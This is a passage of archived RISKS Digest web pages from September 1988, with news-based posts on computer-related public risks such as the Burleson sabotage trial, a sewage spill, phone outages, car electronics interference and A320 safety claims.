  "The jury heard the evidence and did what they felt was best," McCown said.
"This proves it is not an unprosecutable offense. It may be hard to put a case
together, but it's not impossible."
  Burleson, of Irving, is scheduled to be sentenced this morning by Bradshaw, a
retired state district judge who presided over the nine-day trial in Impact
Court II in Fort Worth.
  The third-degree felony of which Burleson was convicted carries a possible
punishment of two to 10 years in prison and a fine up to $5,000. As a
first-time offender, Burleson  is eligible for probation.
  Burleson already has lost a $12,000 civil lawsuit to USPA &amp; IRA, the Fort
Worth security brokerage and insurance company for which he worked until he was
fired for unrelated reasons Sept. 18, 1985, just days before company officials
discovered that 168,000 records of sales commissions had been deleted from
their computer system.
  The computer virus was discovered by USPA &amp; IRA employees as they worked
feverishly to restore the records, which were deleted sometime after 3 a.m.
Sept. 21, 1985, witnesses testified.
  Although hundreds of computer records and other documents were introduced
during the trial, the main issue became the credibility of key witnesses,
including Burleson and Duane Benson, a USPA &amp; IRA senior programmer analyst who
unraveled the destructive scheme he said was traced to Burleson.
  Benson, who spent four days testifying about how he uncovered the scheme,
said the destructive programs were created Sept. 2 and Sept. 3, 1985, on
Burleson's computer terminal by someone using Burleson's computer password.
 
  The automated virus series, which was designed to repeat itself periodically
until it destroyed all the records in the computer system, never was
automatically activated, Benson said. Instead, someone manually set one of the
programs in motion Sept. 21, deleting the records, then covering his tracks by
deleting the program, he said.
  But Burleson and a computer expert he hired contended that the virus and the
related delete program could have been created by someone else using Burleson's
terminal and password.
  Burleson contended that he and Benson did not get along and that Benson
created the destructive programs to make Burleson look bad and Benson look good
when he restored the damaged system.
  Prosecutors contended that Burleson, who had been fired, had more motive to
destroy the records than did Benson, to whom Burleson confessed the sabotage a
week after it was discovered, according to Benson's testimony.
  But Burleson's  alibi  was his undoing,  one juror said.
  Burleson testified that he was more than 300 miles from Fort Worth on Sept. 2
and Sept. 3, and he produced a Texaco credit card receipt  he said proved he
had a tire repaired in Rusk on Sept. 3, on his trip home from Jasper. His son,
father and former wife  supported his alibi.
  But Burleson school attendance records show that Burleson's son was in school
Sept. 3, not traveling with his father. A Texaco official said the receipt
Burleson produced was printed October 1987, two years after the alleged
transaction. And USPA &amp; IRA records showed Burleson attended a staff meeting 
Sept. 3.
  "Three or four days ago, I was absolutely convinced he was innocent,"  juror
Randal Scott Owen of Fort Worth said last night after the verdict. "But I feel
he fabricated stories about his alibi. That just destroyed his credibility with
us.
  "He didn't have the burden of proof, but he should have shrugged his
shoulders and said, "I'm innocent and I have no proof,' " instead of
fabricating evidence, Owen said.
  Eleven other jurors declined to comment before leaving the courtroom. And
Owen acknowledged that the trial was hard on everyone.
  "I have a real problem sending someone to jail for a white-collar crime," he
said.
  Burleson also declined to comment after the verdict, sitting slumped at the
defense table as his attorney, Jack Beech, gave media interviews.
  "I was sort of surprised," Beech said. "I had expected a better verdict.
We'll have to wait until after the sentence to decide whether we want to
appeal."

    [Of course, it was a time-bomb, not a virus.  But then so were many of
    the other so-called viruses.  By now the popular press have completely
    perverted both "virus" and "hacker", but in any subsequent RISKS
    discussions, let's try to rise above that.  BTW, I received shorter
    versions from Steve Smaha and Henry Cox, but in this case decided
    to go with the long one, for the possible interest of those of you
    whose local papers truncated.  PGN]

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/7.55.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.57.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-9</DOCNO>
<DOCOLDNO>IA012-000131-B034-184</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/7.57.html 128.240.150.127 19970217023224 text/html 25347
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:30:48 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 7: Issue 57</TITLE>
<LINK REL="Prev" HREF="/Risks/7.56.html">
<LINK REL="Up" HREF="/Risks/index.7.html">
<LINK REL="Next" HREF="/Risks/7.58.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/7.56.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.58.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 7: Issue 57</H1>
<H2> Saturday 24 September 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Faulty locks delay prison opening 
</A>
<DD>
<A HREF="#subj1.1">
Henry Cox
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  In the future, risks of purchasing handguns 
</A>
<DD>
<A HREF="#subj2.1">
Alan Kaminsky
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Olympian RISKS 
</A>
<DD>
<A HREF="#subj3.1">
Henry Cox
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  [Another Willamette] Sewage Spill Linked to Computer 
</A>
<DD>
<A HREF="#subj4.1">
Nike Horton
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Keep backups, risk job 
</A>
<DD>
<A HREF="#subj5.1">
James F. Carter
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Computer failure shuts down several thousand telephones 
</A>
<DD>
<A HREF="#subj6.1">
Vince Manis
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  LA Times photo of humorous credit card maybe not so funny 
</A>
<DD>
<A HREF="#subj7.1">
Michael Coleman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Risks of Cellular Phones? 
</A>
<DD>
<A HREF="#subj8.1">
Chuck Weinstock
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  Auto Computer Risks 
</A>
<DD>
<A HREF="#subj9.1">
Chuck Weinstock
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj10">
  Volvo's and Electromagnetic Interference 
</A>
<DD>
<A HREF="#subj10.1">
Bill Welch
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj11">
  Scientific Safety 
</A>
<DD>
<A HREF="#subj11.1">
B.Littlewood
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj12">
  Computer Defaults (The Mental Tyrrany of Cash Registers) 
</A>
<DD>
<A HREF="#subj12.1">
Stephen Rickaby
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Faulty locks delay prison opening
</A>
</H3>
<address>
Henry Cox  
&lt;<A HREF="mailto:cox@spock.ee.mcgill.ca">
cox@spock.ee.mcgill.ca
</A>&gt;
</address>
<i>
Thu, 22 Sep 88 19:59:46 edt
</i><PRE>

LOCKS THAT WORK ARE KEY TO OPENING OF NEW JAIL
Montreal Gazette, 22 Sept 1988 

Placerville, Calif. (AP) - The new El Dorado County jail would be ready to open
except for one problem:  the cell doors won't lock.  Faulty electronics have
affected the high-technology locks, along with television monitors and a
communication system, jail commander Ed Newman said.  "These are very dramatic
problems," said Newman, adding that 13 flawed electronic panels are "literally
the hands and feet of the officers."  The panels have been shipped to a
Maryland electronics company to be reworked and won't be back for three weeks.

The jail's design relies on a central control post from which guards can
electronically open and close cell doors, communicate with prisoners and
operate lights.  The jail's contractor is paying a daily penalty of $1250 to
compensate for the delays, county general services director Joe Winslow said.

[ Kidding aside, one hopes that the jails designers were/are aware of the risks
inherent in such a centralized system.  Perhaps we ought to mail them a few
back issues of RISKS. ]

     [Don't kid yourself.  There are equally nasty risks with distributed
     control.  PGN]

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
In the future, risks of purchasing handguns
</A>
</H3>
<address>
&lt;<A HREF="mailto:ark%asgard@CS.RIT.EDU">
ark%asgard@CS.RIT.EDU
</A>&gt;
</address>
<i>
Thu, 22 Sep 88 09:24:02 EDT
</i><PRE>

An excerpt from Time Magazine, September 26, 1988, p. 26.

  "Why Wait a Week to Kill?  The gun lobby 
  overwhelms an attempt to restrict handguns."

[...The article begins with a description of the Brady Amendment that would
have required gun dealers to wait seven days before completing a handgun
sale, so police could do an identity check on the purchaser.  The National
Rifle Association lobbied hard against the amendment, and the House of
Representatives defeated it, 228 to 182.  Now for the computer risk...]

"Florida Republican Congressman Bill McCollum Jr. offered a way out of the
quandary.  He proposed replacing the waiting-period requirement with a
provision to give all 275,000 federally licensed gun dealers in the U.S.
instant access to a nationwide list of convicted felons.  Prospective gun
buyers could be fingerprinted and the samples sent electronically to
Washington for an instantaneous check against the FBI's millions of prints.

"But there is no master list of convicted felons, no way to make such data
quickly and widely available, and no speedy means of sending and matching
fingerprints.  A network to provide such information could take years to
create and cost up to $500 million; making it available to gun dealers could
violate civil liberties.  Beyond that, McCollum's system would not prevent
gun sales to illegal aliens and the mentally ill.

"Still, a majority of House members reached for this fig leaf.  They voted
to kill the Brady amendment and replace it with McCollum's phantom plan. ..."

Just imagine what could go wrong if this legislation ever got past the
Senate and the President, and such a system were implemented ...

Alan Kaminsky				P.O. Box 9887
School of Computer Science		Rochester, NY  14623
Rochester Institute of Technology	716-475-5255

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Olympian RISKS
</A>
</H3>
<address>
Henry Cox  
&lt;<A HREF="mailto:cox@spock.ee.mcgill.ca">
cox@spock.ee.mcgill.ca
</A>&gt;
</address>
<i>
Thu, 22 Sep 88 19:57:51 edt
</i><PRE>

ROOF RIPS AGAIN [ From the Montreal Gazette, 9 Sept. 1988 ]

The Olympic Stadium's fabric roof suffered yet another rip yesterday - this one
three meters long. [ I have no idea how many other rips there have been. ]

The Olympic Installations Board said in a statement it was disappointed by the
mishap, which happened during tests of the roof's automatic retracting
mechanism, because workers had got the roof-opening procedure down to below one
hour.  The board said computer controls on one winch weren't working, placing
uneven tension on the fabric.  Repairs should be done by tomorrow.

[ Not a great story, but, after legendary cost over runs, an Olympic deficit
that we are *still* paying off, and a roof that finally came 12 years late (and
at approximately the cost of a *complete* covered stadium), I thought the
Stadium roof deserved a mention in RISKS.  ]
                    					Henry Cox

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Sewage Spill Linked to Computer [BTW, See RISKS-7.7]
</A>
</H3>
<address>
Nike Horton 
&lt;<A HREF="mailto:horton%reed.uucp@RELAY.CS.NET">
horton%reed.uucp@RELAY.CS.NET
</A>&gt;
</address>
<i>
Thu, 22 Sep 88 09:42:36 PDT
</i><PRE>

SPILL LINKED TO COMPUTER
The Oregonian (Portland, OR) Sept 22, 1988 page B2

	A computer programming error combined with a burned-out wire led to a
sewage spill into the Willamette River this week, said J.  Michael Read,
supervisor of the Tri City Service District.  District technicians estimated
Wednesday 1.5 million gallons of sewage spilled into the Willamette near the
mouth of the Clackamas River late Monday and early Tuesday, Read said.  The
district serves about 40,000 persons in Oregon City, West Linn and part of
Gladstone.  The state Department of Environmental Quality lifted its warning to
stay out of the river below Willamette Falls at 7am Wednesday.
	While the burned-out wire stopped the sewage treatment pumps, he said,
a programming error kept an automatic telephone dialing mechanism from
signaling anyone that the machinery wasn't working, Read said.
	District employees will be checking other alarms to see if any similar
problems exist in the system, which is less than 2 years old, Read said.  A
back-up alarm, which was being installed at the time of this week's spill, may
be operating by the end of the week, the supervisor said.

    [Readers may recall earlier sewage spills into the Willamette River,
    also blamed on the computer, and noted in RISKS-7.7 in a contribution
    from Randal L. Schwartz:

      June 1988: "Sewage flows into river; computer failure blamed" --
      The five-hour spill from the Sullivan Pump Station poured about 5.4
      million gallons into the Willamette River downtown.

      June 1985: Another computer failure caused the dumping of more than 3
      million gallons of raw sewage into the Willamette from the same pump
      station.

   Perhaps that is a new meaning for "garbage in, garbage out."  PGN]

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Keep backups, risk job
</A>
</H3>
<address>
&lt;<A HREF="mailto:jimc@math.ucla.edu">
jimc@math.ucla.edu
</A>&gt;
</address>
<i>
Fri, 23 Sep 88 09:07:48 PDT
</i><PRE>

From Los Angeles Times, 9/23/88, page 1 (Mark Gladstone and Paul Jacobs,
Times Staff Writers):

"The day after the FBI raided [state] Capitol offices last month, a
legislative employee noticed a tenfold increase in the purging of documents
from the legislative computer system and acted quickly to save the material
...  Paul Hueslkamp, who works in the legislative data center, confirmed
that he and co-worker Michael E. Parr were suspended by the legislative
counsel's office pending the outcome of an internal investigation.

"Parr, a 15-year state employee and a data processing supervisor, refused an
order by his superiors to erase the computer tapes, feeling it would be
construed as an obstruction of justice, Huelskamp told The Times. ...

"Instead of the typical 70 to 80 computer deletions, Huelskamp discovered 750
to 800.  The employee quickly extended the life of backup tapes until the
end of the year.  Normally, they would have been automatically erased after
14 days.  'I thought it might be useful for the FBI,' said Huelskamp ...

"The GOP sources said that the caucus staffers, aware it is illegal to
conduct political campaigns with public resources, were worried that FBI
agents would discover the material in the state computer.  ...

"The legislative counsel, according to the source, ordered the internal
investigation because he felt the traditional lawyer-client relationship may
have been violated by the employees.  The legislative counsel is the lawyer
for the legislature and also controls the computer system."

[Disclaimer: Opinions herein are mine and are not to be construed as
representing those of The Regents of the University of California.]

James F. Carter        (213) 825-2897
UCLA-Mathnet;  6608B MSA; 405 Hilgard Ave.; Los Angeles, CA  90024-1555

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Computer failure shuts down several thousand telephones
</A>
</H3>
<address>
Vince Manis
&lt;<A HREF="mailto:manis@grads.cs.ubc.ca ">
manis@grads.cs.ubc.ca 
</A>&gt;
</address>
<i>
Thu, 22 Sep 88 11:38:52 PDT
</i><PRE>

According to a story in yesterday's Vancouver Sun, a failure at a telephone 
switching centre caused several thousand phones in an area on the west side
of Vancouver to be inoperative for about 1 hour. Apparently, the phones would 
accept incoming calls (and ring), but would not permit outgoing calls to be 
made (including, one assumes, 911 calls). There was no report of any personal
injury or loss as a result of the outage.

A BC Telephone Co. spokesperson said that the failure was due to a `computer
bug', but couldn't be more specific. The centre in question serves a number
of exchanges, but only part of one exchange was affected. 

Vincent Manis, Department of Computer Science, University of British Columbia
Vancouver, BC, Canada V6T 1W5                manis@cs.ubc.ca

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
LA Times photo of humorous credit card maybe not so funny
</A>
</H3>
<address>
Michael Coleman
&lt;<A HREF="mailto:coleman@CS.UCLA.EDU ">
coleman@CS.UCLA.EDU 
</A>&gt;
</address>
<i>
Thu, 22 Sep 88 12:49:35 PDT
</i><PRE>

(Reproduced without permission from the Los Angeles Times, 9/22/88)

	  Citibank Visa Gives Credit Where Credit Isn't Due
		by Douglas Frantz, Times Staff Writer

Doris A. Stokes applied for a Visa credit card from Citibank over the telephone
a few weeks ago.  When a Citibank employee asked Stokes if she wanted a second
card for another family member, she replied, "Maybe later."  Her shiny new
Citibank Visa card arrived at Stokes' Los Angeles home this week.  So did one
for Maube Later.  "I brought it down to work, and everybody here was in tears
laughing so hard about it," said Stokes, and administrative assistant at the
Los Angeles Junior Chamber of Commerce.  The response was more subdued at the
New York headquarters of Citibank, the nation's largest bank and the world's
biggest issuer of Visa and MasterCard credit cards.  "Are you serious?" asked
Susan Weeks, a bank spokeswoman in New York, when the incident was described to
her.  Assured that the talk was true, she groaned, "Oh, no."  (rest deleted)

  (Appearing above the article is a large picture of a smiling Doris A.
  Stokes holding a Citibank Visa with the name Maube Later.)

While the story itself is somewhat amusing, I wonder more about the wisdom of
using that particular picture.  In it we can clearly see everything on the
card, including the number (xxx8 140 851 226), except for the first three
digits, which are obscured by Stokes' finger.  This apparently is to keep
someone from using this information for illegal ends.  But wait, if Citibank is
"the world's biggest issuer of Visa ... cards", perhaps I have one laying
around.  Here it is: the bank number (the first four digits) is 4128.  Oops.

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Risks of Cellular Phones?
</A>
</H3>
<address>
Chuck Weinstock 
&lt;<A HREF="mailto:weinstoc@SEI.CMU.EDU">
weinstoc@SEI.CMU.EDU
</A>&gt;
</address>
<i>
Mon, 19 Sep 88 10:14:00 EDT
</i><PRE>

While discussing radio triangulation last night, the question came up:
If I dial a phone number attached to a cellular phone, how does the
cellular system know which cell should send the ring signal to the
phone?  Is it a system wide broadcast, or does the cellular phone
periodically broadcast a "here I am" signal?

If the latter, a less than benevolent government (or phone company for
that matter) could use that information to track its citizens' cars'
whereabouts.  In an industrial setting, a competitor with access to
the right information could track a sales reps sales calls to develop
a client list.

Chuck Weinstock

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
Auto Computer Risks
</A>
</H3>
<address>
Chuck Weinstock 
&lt;<A HREF="mailto:weinstoc@SEI.CMU.EDU">
weinstoc@SEI.CMU.EDU
</A>&gt;
</address>
<i>
Mon, 19 Sep 88 10:09:06 EDT
</i><PRE>

On occasional Sundays I participate in time-speed-distance (TSD) road rallies.
The object is to follow a course (on public streets) driving it at exactly the
right speed as given by the instructions.  Your car is timed as it passes
certain points not known to you in advance, and you are assessed a penalty for
every 1/100th of a minute you are early or late.  The person who creates the
rally tries to write the instructions so that they are accurate but mistake
prone, so course following can be tricky.

To avoid the constant need for on-time calculations (to free up time for the
navigator to help stay on course), many experienced rallyists run with special
purpose digital computers hooked up to record distance and display timing
information.  These are hooked into the car's electrical system for power.

A friend just purchased a new Ford Probe (Mazda) and the service manager told
him to be careful how he wired anything into the electrical system as the car
had its own computer on board.  My friend decided one day to try his rally
computer out and used a cigarette lighter adapter to hook up the power.  The
computer seemed to run ok, but when he later started the car, it would not
idle.  It would start fine, and he could drive it as long as he didn't take his
foot of the gas.  If he did the RPM's would drop to zero and the car would
stall.  He removed his computer and drove the car for about 10 minutes and
things got back to normal.  He has subsequenty wired his computer into the
electrical system directly and has had no further problems.

One wonders if a radar detector or a cb radio (two common appliances that use
the cigarette lighter) would cause the same difficulty.
                                                                Chuck Weinstock

</PRE>
<A NAME="subj10"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj10.1">
Volvo's and Electromagnetic Interference
</A>
</H3>
<address>
"BILL WELCH, BCD COMPUTING CENTER, (614)424-7155" 
&lt;<A HREF="mailto:WELCH@battelle.arpa">
WELCH@battelle.arpa
</A>&gt;
</address>
<i>
Mon, 19 Sep 88 15:22 EST
</i><PRE>

I own two Volvos - a 1984 and a 1988 DL245 station wagon. Both cars suffer
strange effects to various computer/electronic systems in the present of
radio signals. When I use my HAM radio transmitter on the 2 meter FM band
(144..148 MHz) both have problems. The 1984 cruise control drops out, and on
the 1988 the turn signals blink twice as fast as normal and the speedometer
drops to zero.

    [We have had a bunch of messages on this subject in past issues, but the
    problem has evidently not gone away.  PGN]

</PRE>
<A NAME="subj11"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj11.1">
 Scientific Safety
</A>
</H3>
<address>
B.Littlewood 
&lt;<A HREF="mailto:sd396@CITY.AC.UK">
sd396@CITY.AC.UK
</A>&gt;
</address>
<i>
22 Sep 1988 15:43:24-WET DST
</i><PRE>

I'm sorry William Murray has problems with my English.  In the case of the
Airbus A320 the notion of an "acceptable level of safety" is, unusually,
spelled out by the manufacturers of the critical fly-by-wire system.  They
say that the reliability REQUIREMENT is 10**-9 failures per hour (see paper
by Rouquet and Traverse in Proceedings of SAFECOMP 86).  Their reason for
adopting such a demending requirement is that (in their own words) " . . loss
of . . function cannot be tolerated."

In a case like this it would, I think, be perverse to regard the system as
"acceptably safe" if it had not satisfied the manufacturer's own requirements.
Let us be charitable and take it that this requirement is not merely necessary
but but sufficient for the award of the coveted status of "acceptably safe".

My assertion was simply that, in these terms, the A320 had NOT been demonstrated
to be "acceptably safe".  Indeed I believe that such cannot be demonstrated.
I would go further and offer an opinion that the actual achieved reliability
of the system is orders of magnitude less than this requirement.

Murray goes on to say that such novel technology would not be tolerated in
the US unless it could be "proved" to be safer than the technology in use.
This seems to me a pretty acceptable way forward, and I assume that it would
not require demonstration of the achievement of ludicrous figures such as
that above.  However, even this more modest goal has not been demonstrated
and it is my understanding that it will not be required before the plane
gets a US certificate.  Given the role played by software in this system,
and the absence of a fully functioning mechanical back-up, I do not believe
that such a demonstration is possible.

I have a lot of sympathy with Murray's comments on our blithe acceptance of
the mayhem which results from automobiles, tobacco, etc., and the difficulty
of getting this on the political agenda.  It would be a pity, though, if
manufacturers of aircraft were allowed to get away with building less safe
systems than hitherto, merely by appealing to the fact that flying is safer
than smoking!

Bev Littlewood, Centre for Software Reliability, City University London EC1V 0HB

</PRE>
<A NAME="subj12"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj12.1">
Computer Defaults (was: The Mental Tyrrany of Cash Registers)
</A>
</H3>
<address>
Stephen Rickaby 
&lt;<A HREF="mailto:sfr@praxis.UUCP">
sfr@praxis.UUCP
</A>&gt;
</address>
<i>
Wed, 21 Sep 88 14:52:10 BST
</i><PRE>

Reading comments in RISKS about implicit belief in computers reminded me of a
phenomenon I encountered in a previous job. Faced with the task of producing a
large volume of related software, one of the tasks we undertook was the design
of a common i/o library, partly for efficiency and partly to ensure a uniform
`feel' across the software.

As our terminals were pretty much glass teletype mode, one attempt to introduce
an element of user-friendliness was to give as many interactive screen routines
as possible 'hot defaults': a suitable value for the parameter being requested
would be displayed in braces ([thus]), this convention (HP and others) meaning
'the value you will get if you press &lt;return&gt;'. The slight touch of
sophistication was that (valid) alternative values entered were swapped into
the [braces], and &lt;return&gt; alone was required to confirm them. The system
worked quite well, particularly for largely numerical interfaces for programs
with a large iterative content and small changes in parameters for each
iteration, typical of mathematical modelling and similar applications.

However, much of this software was for computer-assisted ATE work, performed by
staff who had a very sound grasp of the work they were doing but not
necessarily of computers. After a while, the following phenomenon was noted:
when the default parameters were presented, they were often accepted even
though the operator did not know a suitable value or even *thought they were
wrong*. This was not out of laziness or a reluctance to use a keyboard, but
because *the computer had suggested a value*, so it must be correct.

We never solved this one, and I left before the megawatt RF amplifiers were
automated...

Steve Rickaby, Praxis Systems plc, 20 Manvers Street, Bath, BA1 1PX, UK,
Tel: +44 225 444700  sfr%praxis.uuc@ukc.ac.uk  !mcvax!ukc!praxis!sfr        

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/7.56.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.58.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-10</DOCNO>
<DOCOLDNO>IA012-000131-B034-203</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/7.58.html 128.240.150.127 19970217023237 text/html 22821
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:31:05 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 7: Issue 58</TITLE>
<LINK REL="Prev" HREF="/Risks/7.57.html">
<LINK REL="Up" HREF="/Risks/index.7.html">
<LINK REL="Next" HREF="/Risks/7.59.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/7.57.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.59.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 7: Issue 58</H1>
<H2> Monday 26 September 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Computers in local govt - a burning issue? 
</A>
<DD>
<A HREF="#subj1.1">
Dave Horsfall
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  North Cornwall water supply polluted 
</A>
<DD>
<A HREF="#subj2.1">
Paul Mansbacher via Willie Smith
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Re: Risks of cellular telephones 
</A>
<DD>
<A HREF="#subj3.1">
Alan Kaminsky
</A><br>
<A HREF="#subj3.2">
 John Gilmore
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Other voice mailbox risks reported 
</A>
<DD>
<A HREF="#subj4.1">
Bahn
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Auto Computers vs. radios 
</A>
<DD>
<A HREF="#subj5.1">
Steve Jay
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  State Records via Computer 
</A>
<DD>
<A HREF="#subj6.1">
William Curtiss
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Damage by Disney 3-D glasses 
</A>
<DD>
<A HREF="#subj7.1">
Andrew Klossner
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Re: more on killer remote controlls 
</A>
<DD>
<A HREF="#subj8.1">
Greeny
</A><br>
</DL>

